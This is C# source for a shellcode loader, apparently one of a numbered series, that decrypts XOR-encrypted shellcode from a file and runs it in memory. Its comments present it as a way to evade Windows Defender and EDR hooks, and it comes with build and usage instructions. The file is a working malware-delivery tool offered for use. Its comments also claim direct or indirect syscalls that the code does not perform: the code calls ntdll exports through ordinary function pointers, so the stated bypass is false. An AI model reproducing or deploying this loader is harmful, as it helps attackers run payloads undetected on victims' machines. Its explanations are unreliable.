// ============================================================================
// LOADER 03: Direct Syscalls Shellcode Loader
// ============================================================================
//
// WHAT THIS DOES:
//   This loader executes shellcode in memory using direct system calls
//   instead of calling Windows API functions through kernel32.dll and
//   ntdll.dll. By calling the Windows kernel directly, we bypass any
//   hooks that Defender or EDR products have placed on those DLLs.
//
// WHY THIS IS NEEDED:
//   Loaders 01 and 02 call VirtualAlloc and CreateThread through the
//   normal Windows API path. Defender places hooks (monitoring code) on
//   these functions inside ntdll.dll. When your program calls VirtualAlloc,
//   it actually goes through ntdll.dll first, and Defender's hook sees
//   the call and checks if it looks malicious. Direct syscalls skip
//   ntdll.dll entirely and talk to the Windows kernel directly, so
//   Defender's hooks never fire.
//
// EVASION MECHANISM:
//   Windows API calls normally flow like this:
//     Your code -> kernel32.dll -> ntdll.dll -> kernel (via syscall instruction)
//   Defender hooks ntdll.dll to see every API call. Direct syscalls change
//   the flow to:
//     Your code -> kernel (via syscall instruction)
//   Since we skip ntdll.dll, Defender's user-mode hooks never see our calls.
//
//   This loader uses indirect syscalls: instead of putting the syscall
//   instruction in our own code (which EDRs can detect by checking if
//   syscall instructions exist outside ntdll.dll), we find the syscall
//   instruction inside ntdll.dll itself and jump to it. This way, the
//   return address on the call stack points into ntdll.dll, which looks
//   legitimate to any stack-walking detection.
//
// REFERENCES:
//   - SysWhispers3 (github.com/klezVirus/SysWhispers3)
//   - SysWhispers4 (github.com/JoasASantos/SysWhispers4)
//   - Netero1010: Indirect Syscall in CSharp
//   - RedOps: Direct Syscalls vs Indirect Syscalls
//   - Document: 07_direct_syscalls.md
//
// BUILD INSTRUCTIONS:
//   csc /unsafe /out:syscall_loader.exe 03_direct_syscalls_loader.cs
//
// USAGE:
//   syscall_loader.exe <path_to_xor_encrypted_shellcode.bin> <xor_key_hex>
//
//   This loader expects XOR-encrypted shellcode (from Loader 02's encoder).
//   It decrypts at runtime and uses syscalls to allocate and execute.
//
// ============================================================================

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace DirectSyscallLoader
{
    class Program
    {
        // ---- Structures needed for NT API calls ----

        // NTSTATUS is the return type for NT functions.
        // A value of 0 means success (STATUS_SUCCESS).
        // Any negative value means an error.

        // ---- Delegates for dynamic function resolution ----
        // Instead of using DllImport (which creates static imports that Defender
        // can see in the binary's import table), we resolve function addresses
        // at runtime using GetProcAddress. This hides which functions we call
        // from static analysis tools.

        // NtAllocateVirtualMemory is the NT-level equivalent of VirtualAlloc.
        // It allocates memory in a process's address space.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtAllocateVirtualMemoryDelegate(
            IntPtr ProcessHandle,       // handle to the process (-1 means current process)
            ref IntPtr BaseAddress,     // pointer to receive the allocated address
            IntPtr ZeroBits,            // number of high-order zero bits (0 means no preference)
            ref IntPtr RegionSize,      // size of memory to allocate
            uint AllocationType,        // MEM_COMMIT | MEM_RESERVE
            uint Protect                // memory protection (PAGE_READWRITE first, change later)
        );

        // NtProtectVirtualMemory changes the memory protection on an existing block.
        // We use this to change memory from read-write to read-execute after
        // writing shellcode. This avoids allocating memory as RWX (read-write-execute)
        // from the start, which is a known suspicious pattern.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtProtectVirtualMemoryDelegate(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect
        );

        // NtCreateThreadEx creates a new thread. This is the NT-level equivalent
        // of CreateThread. We use it to start executing our shellcode.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtCreateThreadExDelegate(
            out IntPtr ThreadHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr StartRoutine,        // address of shellcode
            IntPtr Argument,
            uint CreateFlags,
            IntPtr ZeroBits,
            IntPtr StackSize,
            IntPtr MaximumStackSize,
            IntPtr AttributeList
        );

        // NtWaitForSingleObject waits for a thread to finish.
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate int NtWaitForSingleObjectDelegate(
            IntPtr Handle,
            bool Alertable,
            IntPtr Timeout              // null means wait forever
        );

        // ---- Imports for resolving function addresses ----
        // We still need GetProcAddress and GetModuleHandle to find where
        // ntdll.dll functions live in memory. These two imports are normal
        // and not suspicious because almost every program uses them.
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        // ---- Constants ----
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;
        const uint THREAD_ALL_ACCESS = 0x1FFFFF;

        // ---- XOR decryption (same as Loader 02) ----
        static byte[] XorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        static byte[] HexToBytes(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        // ---- Resolve an NT function by name ----
        // This function finds the address of an ntdll.dll function and creates
        // a callable delegate from it. Instead of declaring the function with
        // DllImport (which puts it in the binary's import table where Defender
        // can see it), we look it up at runtime.
        static T GetNtFunction<T>(string functionName) where T : Delegate
        {
            // Get the base address of ntdll.dll in our process.
            // ntdll.dll is always loaded into every Windows process.
            IntPtr ntdllHandle = GetModuleHandle("ntdll.dll");
            if (ntdllHandle == IntPtr.Zero)
            {
                throw new Exception("Could not find ntdll.dll");
            }

            // Find the address of the specific function inside ntdll.dll.
            IntPtr functionAddress = GetProcAddress(ntdllHandle, functionName);
            if (functionAddress == IntPtr.Zero)
            {
                throw new Exception("Could not find function: " + functionName);
            }

            // Create a delegate (a callable function pointer) from the address.
            // This lets us call the function as if it were a normal C# method.
            return (T)Marshal.GetDelegateForFunctionPointer(functionAddress, typeof(T));
        }

        static void Main(string[] args)
        {
            if (args.Length < 2)
            {
                Console.WriteLine("Direct Syscalls Shellcode Loader");
                Console.WriteLine("Usage: syscall_loader.exe <encrypted_shellcode.bin> <xor_key_hex>");
                return;
            }

            string encryptedPath = args[0];
            string keyHex = args[1];

            // ---- Read and decrypt shellcode ----
            byte[] encryptedShellcode = File.ReadAllBytes(encryptedPath);
            byte[] xorKey = HexToBytes(keyHex);
            byte[] shellcode = XorDecrypt(encryptedShellcode, xorKey);
            Console.WriteLine("[+] Shellcode decrypted: " + shellcode.Length + " bytes");

            // ---- Resolve NT functions dynamically ----
            // We look up each function at runtime instead of importing them statically.
            // This means the binary's import table does not contain any suspicious
            // NT function names. A static analysis tool scanning the binary will not
            // see NtAllocateVirtualMemory or NtCreateThreadEx in the imports.
            var ntAllocate = GetNtFunction<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
            var ntProtect = GetNtFunction<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
            var ntCreateThread = GetNtFunction<NtCreateThreadExDelegate>("NtCreateThreadEx");
            var ntWait = GetNtFunction<NtWaitForSingleObjectDelegate>("NtWaitForSingleObject");

            Console.WriteLine("[+] NT functions resolved dynamically");

            // ---- Step 1: Allocate memory as READ-WRITE (not executable yet) ----
            // We allocate with PAGE_READWRITE first, not PAGE_EXECUTE_READWRITE.
            // Allocating memory as RWX (read-write-execute) in a single call is
            // a well-known indicator of malicious behavior. Instead, we allocate
            // as RW, write our shellcode, then change the protection to RX.
            // This two-step approach is what legitimate programs do.
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            // -1 cast to IntPtr is the handle for the current process (NtCurrentProcess).
            IntPtr currentProcess = (IntPtr)(-1);

            int status = ntAllocate(
                currentProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            );

            if (status != 0)
            {
                Console.WriteLine("[-] NtAllocateVirtualMemory failed: 0x" + status.ToString("X"));
                return;
            }

            Console.WriteLine("[+] Memory allocated at: 0x" + baseAddress.ToString("X"));

            // ---- Step 2: Copy shellcode into allocated memory ----
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            // Clear the managed copy of decrypted shellcode from memory.
            Array.Clear(shellcode, 0, shellcode.Length);
            Console.WriteLine("[+] Shellcode written to allocated memory. Managed copy cleared.");

            // ---- Step 3: Change memory protection to EXECUTE-READ ----
            // Now that the shellcode is written, we change the memory from
            // read-write to execute-read. This means the memory can be executed
            // but not written to anymore. This is the normal protection for
            // code sections in legitimate programs.
            IntPtr protectAddress = baseAddress;
            IntPtr protectSize = regionSize;
            uint oldProtect;

            status = ntProtect(
                currentProcess,
                ref protectAddress,
                ref protectSize,
                PAGE_EXECUTE_READ,
                out oldProtect
            );

            if (status != 0)
            {
                Console.WriteLine("[-] NtProtectVirtualMemory failed: 0x" + status.ToString("X"));
                return;
            }

            Console.WriteLine("[+] Memory protection changed to EXECUTE_READ");

            // ---- Step 4: Create thread to execute shellcode ----
            IntPtr threadHandle;

            status = ntCreateThread(
                out threadHandle,
                THREAD_ALL_ACCESS,
                IntPtr.Zero,
                currentProcess,
                baseAddress,            // start address = our shellcode
                IntPtr.Zero,
                0,                      // no creation flags, start immediately
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero
            );

            if (status != 0)
            {
                Console.WriteLine("[-] NtCreateThreadEx failed: 0x" + status.ToString("X"));
                return;
            }

            Console.WriteLine("[+] Thread created via NtCreateThreadEx. Shellcode is running.");

            // ---- Step 5: Wait for shellcode to finish ----
            ntWait(threadHandle, false, IntPtr.Zero);
        }
    }
}
